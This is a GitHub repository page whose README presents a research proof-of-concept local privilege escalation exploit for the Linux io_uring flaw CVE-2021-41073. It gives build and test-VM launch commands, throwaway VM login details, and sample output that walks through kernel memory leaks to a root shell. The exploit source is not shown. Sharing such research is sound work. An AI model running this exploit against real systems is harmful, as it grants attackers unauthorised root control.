
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fchompie1337%2FLinux_LPE_io_uring_CVE-2021-41073)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fchompie1337%2FLinux_LPE_io_uring_CVE-2021-41073)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=chompie1337%2FLinux_LPE_io_uring_CVE-2021-41073)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[chompie1337](/chompie1337)
/
**[Linux\_LPE\_io\_uring\_CVE-2021-41073](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073)**
Public

* [Notifications](/login?return_to=%2Fchompie1337%2FLinux_LPE_io_uring_CVE-2021-41073) You must be signed in to change notification settings
* [Fork
  22](/login?return_to=%2Fchompie1337%2FLinux_LPE_io_uring_CVE-2021-41073)
* [Star
   98](/login?return_to=%2Fchompie1337%2FLinux_LPE_io_uring_CVE-2021-41073)

[98
stars](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/stargazers) [22
forks](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/forks) [Branches](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/branches) [Tags](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/tags) [Activity](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/activity)
 [Star](/login?return_to=%2Fchompie1337%2FLinux_LPE_io_uring_CVE-2021-41073)

 [Notifications](/login?return_to=%2Fchompie1337%2FLinux_LPE_io_uring_CVE-2021-41073) You must be signed in to change notification settings

* [Code](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073)
* [Issues
  3](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/issues)
* [Pull requests
  0](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/pulls)
* [Actions](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/actions)
* [Projects
  0](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/projects)
* [Security](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/security)
* [Insights](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/pulse)

Additional navigation options

* [Code](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073)
* [Issues](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/issues)
* [Pull requests](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/pulls)
* [Actions](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/actions)
* [Projects](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/projects)
* [Security](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/security)
* [Insights](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/pulse)

# chompie1337/Linux\_LPE\_io\_uring\_CVE-2021-41073

    main[Branches](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/branches)[Tags](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[7 Commits](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/commits/main/) | | |
| [exploit](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/tree/main/exploit "exploit") | | [exploit](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/tree/main/exploit "exploit") |  |  |
| [.gitignore](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/blob/main/.gitignore ".gitignore") | | [.gitignore](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/blob/main/.gitignore ".gitignore") |  |  |
| [README.md](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/blob/main/README.md "README.md") | | [README.md](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# Linux\_LPE\_io\_uring\_CVE-2021-41073

LPE exploit for CVE-2021-41073 io\_uring type confusion vulnerability.

Checkout the writeup [Put an io\_uring on it: Exploiting the Linux Kernel](https://www.graplsecurity.com/post/iou-ring-exploiting-the-linux-kernel).

author: [@chompie1337](https://twitter.com/chompie1337)

**For educational/research purposes only. Not for use on testing or security evaulations.**

To build (requires [liburing](https://github.com/axboe/liburing)):

```
gcc -o hello hello.c -Wall -std=gnu99 `pkg-config fuse --cflags --libs`
gcc -I include/ -o exploit exploit.c bpf.c -l:liburing.a -lpthread

```

I've provided a [test VM](https://www.dropbox.com/s/lhmpzvhl8mdszc8/test_vm.tar.xz?dl=0) with a 5.15-rc1 kernel for testing/running the exploit.

To start VM, extract [test\_vm archive](https://www.dropbox.com/s/lhmpzvhl8mdszc8/test_vm.tar.xz?dl=0) and run:

```
qemu-system-x86_64  -m 2G  -smp 2  -kernel /path/to/repo/Linux_LPE_io_uring_CVE-2021-41073/test_vm/bzImage    -append "console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0"     -drive file=/path/to/repo/Linux_LPE_io_uring_CVE-2021-41073/test_vm/stretch.img,format=raw -net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 -net nic,model=e1000 -nographic  -pidfile vm.pid 2>&1 | tee vm.log

```

ssh into the box as unprivileged user:

`ssh -p 10021 hi@localhost`
password: lol

To run:

```
$ ./exploit
[+] set/getxattr file created
[+] bpf program loaded created
[+] FUSE maps created
[+] opened /proc/self/maps
[+] io_uring initialized
[+] spraying kmalloc-32 cache with io_buffer structs!!
[!] vuln trigger #1 for task_struct leak
[+] task_struct: ffff90740554c4c0
[!] vuln trigger #2 for KASLR leak
[!] single_next: ffffffffb2064520
[!] vuln trigger #3 for cache ptr leak
[+] fake bpf_prog: ffff9074056aacb0
[!] vuln trigger #4 to overwrite socket filter
[+] it worked! have a r00t shell :)

```

Sometimes needs 3-4 attempts to get through entire exploit sequence. Reboot the VM after each exploit attempt time. Future work can be done to improve this exploit, techniques are provided in the writeup. Releasing the PoC for the strict purpose of sharing knowledge with other researchers, and those who want to learn about **advanced kernel exploitation**.

This exploit is a **PROOF OF CONCEPT** for the techniques discussed in the blog post, and achieve local privilege escalation of the Linux Kernel 5.15-rc-1 with default configurations. It is NOT my intent to tailor an exploit and weaponize it to work with every affected version of Linux. I've provided the code to demonstrate most of the discussed techniques, and have created and documented the techniques needed to bypass various mitigations that some distributions may enable in the accompanying blog post.

The kernel configurations used in the provided testing VM are in the test\_vm folder if you'd like to work with a custom built kernel. If you want to contribute, pull requests are welcome :)

This research was sponsered by [Grapl](https://www.graplsecurity.com/).

## About

No description, website, or topics provided.
### Resources

[Readme](#readme-ov-file)

[Activity](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/activity)
### Stars

[**98**
stars](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/stargazers)
### Watchers

[**5**
watching](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/watchers)
### Forks

[**22**
forks](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fchompie1337%2FLinux_LPE_io_uring_CVE-2021-41073&report=chompie1337+%28user%29)

## [Releases](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/releases)

No releases published

## [Packages 0](/users/chompie1337/packages?repo_name=Linux_LPE_io_uring_CVE-2021-41073)

No packages published

## Languages

* [C
  100.0%](/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/search?l=c)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

